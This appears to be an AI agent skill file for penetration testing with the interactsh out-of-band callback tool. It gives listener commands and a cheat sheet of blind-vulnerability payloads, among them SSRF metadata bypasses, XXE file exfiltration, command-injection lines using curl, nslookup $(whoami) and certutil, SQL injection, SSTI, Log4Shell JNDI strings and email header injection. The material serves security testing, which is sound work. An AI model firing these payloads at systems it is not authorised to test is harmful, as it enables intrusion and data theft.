---
name: interactsh
description: "Out-of-band (OAST / OOB) interaction testing and callback infrastructure using ProjectDiscovery interactsh. Generates unique interaction domains, captures blind interactions (DNS, HTTP, HTTPS, SMTP, LDAP, SMB), supports session persistence, polling, payload tagging, filtering, and protocol-specific canary injection. Use for verifying blind SSRF, out-of-band XXE, blind command injection/RCE, blind SQLi/NoSQLi, blind SSTI, Log4Shell/JNDI, deserialization callbacks, second-order callbacks, and DNS exfiltration. Includes CLI recipes, background daemon management, correlation ID tracking, and payload generation cheat sheets."
allowed-tools: [Read, Write, Edit, Glob, Grep, Bash]
sources: projectdiscovery, community, pentest_methodology
---

# Interactsh OOB Testing Skill

`interactsh` is an open-source Out-of-Band Application Security Testing (OAST) tool by ProjectDiscovery designed to detect blind vulnerabilities where the target server triggers an external network interaction without returning output in the HTTP response.

---

## Tool & Environment Details

- **Binary Location**: `/Users/adrian/go/bin/interactsh-client` (or `interactsh-client` if in `$PATH`)
- **Default Public Servers**: `oast.pro`, `oast.live`, `oast.site`, `oast.online`, `oast.fun`, `oast.me`
- **Supported Callback Protocols**:
  - **DNS**: Query types `A`, `AAAA`, `TXT`, `CNAME`, `NS`
  - **HTTP / HTTPS**: Request method, URI path, headers, request body
  - **SMTP / SMTPS**: Envelope recipient, sender, subject, message body
  - **LDAP**: Search filters, bind requests
  - **SMB**: Negotiation, NTLMSSP authentication probes

---

## Core Workflows & CLI Recipes

### 1. Quick One-Shot Listener

Start interactsh interactively to generate a payload domain and watch incoming callbacks in real time:

```bash
/Users/adrian/go/bin/interactsh-client
```

Output prints:
```
[INF] ... Listing 1 payload for OAST testing
[INF] cXXXXXXXXXXXX.oast.pro
```

### 2. Automated / Background Listener with Session Persistence

For automated scripts, background testing, or long-running scans:

```bash
# Start background listener with session file and JSON output
/Users/adrian/go/bin/interactsh-client \
  -sf ~/.interactsh-session.json \
  -ps -psf /tmp/interactsh_payload.txt \
  -json -o /tmp/interactsh_interactions.jsonl \
  -pi 3 > /tmp/interactsh.log 2>&1 &

# Read the generated payload
INTERACTSH_DOMAIN=$(cat /tmp/interactsh_payload.txt)
echo "Target payload domain: $INTERACTSH_DOMAIN"
```

### 3. Re-polling an Existing Session

Resume a previous session to check for delayed or second-order callbacks:

```bash
/Users/adrian/go/bin/interactsh-client \
  -sf ~/.interactsh-session.json \
  -json -o /tmp/interactsh_interactions.jsonl \
  -poll-interval 5
```

### 4. Protocol-Specific Filtering & Output Formats

Filter callbacks by protocol to reduce noise or focus on specific channels:

```bash
# DNS only (useful for restricted outbound environments or DNS exfiltration)
interactsh-client -dns-only -json -o dns_interactions.jsonl

# HTTP only
interactsh-client -http-only -json -o http_interactions.jsonl

# SMTP only
interactsh-client -smtp-only -json -o smtp_interactions.jsonl

# Pattern matching (only log interactions matching a regex/string)
interactsh-client -m "ssrf-test" -json -o matched.jsonl
```

### 5. Private / Self-Hosted Server Connection

```bash
interactsh-client -s interactsh.internal.corp -t MySecretAuthToken -v
```

---

## Sub-Tagging for Precise Attribution

When injecting payloads into multiple parameters or endpoints, prepend unique sub-tags to attribute which injection succeeded:

```bash
# Structure: <target-id>.<vuln-type>.<parameter>.<payload>
export PAYLOAD=$(cat /tmp/interactsh_payload.txt)

# Example probes:
curl "https://target.com/api?url=http://api-param-url.${PAYLOAD}"
curl "https://target.com/export?webhook=http://export-webhook.${PAYLOAD}"
curl -H "X-Forwarded-Host: xfh-test.${PAYLOAD}" https://target.com/
```

When a callback arrives, the subdomain identifies the exact request and parameter.

---

## Vulnerability-Specific Injection Cheatsheet

### 1. Blind SSRF (Server-Side Request Forgery)

```http
# URL parameters & webhooks
https://target.example.com/api/preview?url=http://${PAYLOAD}/ssrf
https://target.example.com/api/fetch?endpoint=https://${PAYLOAD}/test

# Header injection
X-Forwarded-For: ${PAYLOAD}
X-Forwarded-Host: ${PAYLOAD}
Host: ${PAYLOAD}
Contact: admin@${PAYLOAD}

# Cloud metadata bypass wrapper
http://169.254.169.254.${PAYLOAD}
http://${PAYLOAD}#@169.254.169.254/
```

### 2. Blind Out-of-Band XXE (XML External Entity)

#### Parameter Entity Callback (DNS/HTTP confirmation)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % oob SYSTEM "http://${PAYLOAD}/xxe-ping">
  %oob;
]>
<root><data>test</data></root>
```

#### Out-of-Band File Exfiltration via Hosted DTD
Host external DTD or reference remote payload:
```xml
<!-- Injected XML -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://${PAYLOAD}/eval.dtd">
  %remote;
  %eval;
  %exfil;
]>
<root><data>test</data></root>

<!-- eval.dtd served or staged -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${PAYLOAD}/?data=%file;'>">
```

### 3. Blind Remote Code Execution / Command Injection

#### Linux Bash / Sh
```bash
# DNS probes (often bypass egress firewalls blocking HTTP/HTTPS)
`nslookup rce-dns.${PAYLOAD}`
$(dig rce-dns.${PAYLOAD})
host rce-dns.${PAYLOAD}

# HTTP probes
curl -s http://rce-http.${PAYLOAD}/
wget http://rce-http.${PAYLOAD}/

# DNS exfiltration (hostname / user)
nslookup $(whoami).${PAYLOAD}
curl http://${PAYLOAD}/$(whoami)
```

#### Windows Cmd / PowerShell
```cmd
certutil -urlcache -split -f http://${PAYLOAD}/win win
nslookup %USERNAME%.${PAYLOAD}
powershell -Command "Invoke-WebRequest -Uri http://${PAYLOAD}/ps"
```

### 4. Blind SQL Injection (OOB DNS / HTTP)

#### Microsoft SQL Server (MSSQL)
```sql
-- DNS lookup via SMB master..xp_dirtree
'; EXEC master..xp_dirtree '\\sqli-mssql.${PAYLOAD}\a'--
'; EXEC master..xp_fileexist '\\sqli-mssql.${PAYLOAD}\a'--
```

#### Oracle Database
```sql
SELECT UTL_INADDR.get_host_address('sqli-oracle.' || '${PAYLOAD}') FROM dual;
SELECT UTL_HTTP.request('http://sqli-oracle.' || '${PAYLOAD}') FROM dual;
SELECT HTTPURITYPE('http://sqli-oracle.' || '${PAYLOAD}').getclob() FROM dual;
```

#### MySQL / MariaDB (Windows host or permissive open_basedir)
```sql
SELECT LOAD_FILE(CONCAT('\\\\', 'sqli-mysql.', '${PAYLOAD}', '\\a'));
SELECT ... INTO OUTFILE '\\\\sqli-mysql.${PAYLOAD}\\share';
```

#### PostgreSQL
```sql
-- Requires dblink or COPY
COPY (SELECT '') TO PROGRAM 'nslookup sqli-pg.${PAYLOAD}';
```

### 5. Blind SSTI (Server-Side Template Injection)

- **Java (Spring / Thymeleaf / Freemarker)**:
  `${T(java.net.InetAddress).getByName("ssti-java.${PAYLOAD}")}`
- **Python (Jinja2 / Mako)**:
  `{{ cycler.__init__.__globals__.os.popen('curl http://ssti-py.${PAYLOAD}').read() }}`
- **Ruby (ERB)**:
  `<%= require 'open-uri'; URI.open('http://ssti-ruby.${PAYLOAD}') %>`
- **Node.js**:
  `#{global.process.mainModule.require('http').get('http://ssti-node.${PAYLOAD}')}`

### 6. Blind JNDI / Log4Shell & Deserialization

```
${jndi:ldap://log4j-ldap.${PAYLOAD}/a}
${jndi:dns://log4j-dns.${PAYLOAD}}
${jndi:rmi://log4j-rmi.${PAYLOAD}/a}
```

- **Java URLDNS**: Uses `java.net.URL` in `HashMap` to trigger an authoritative DNS query upon `readObject()`. Zero third-party dependencies.

### 7. Blind Email / SMTP Injections

Inject into contact forms, notification fields, user registration:
```
test@${PAYLOAD}
test%0ABcc:audit@${PAYLOAD}
```

---

## Evidence Hygiene & The "OOB-Or-It-Didn't-Happen" Gate

1. **Verify Before Reporting**:
   - Always confirm the callback received matches the specific timestamp, correlation tag, and unique domain injected.
   - Separate server callbacks from scanner noise (e.g. VirusTotal, Censys, Shodan, or local proxy prefetching).
2. **Inspect the JSON Interaction Record**:
   ```json
   {
     "protocol": "dns",
     "unique-id": "cXXXXXXXX",
     "q-type": "A",
     "raw-request": "...",
     "remote-address": "203.0.113.10",
     "timestamp": "2026-11-11T00:30:00Z"
   }
   ```
3. **Report Documentation Checklist**:
   - Injection parameter & endpoint
   - Exact payload injected with timestamp
   - Callback protocol (DNS/HTTP/SMTP)
   - Source IP address of the target server performing the callback
   - Correlation ID proving non-repudiation
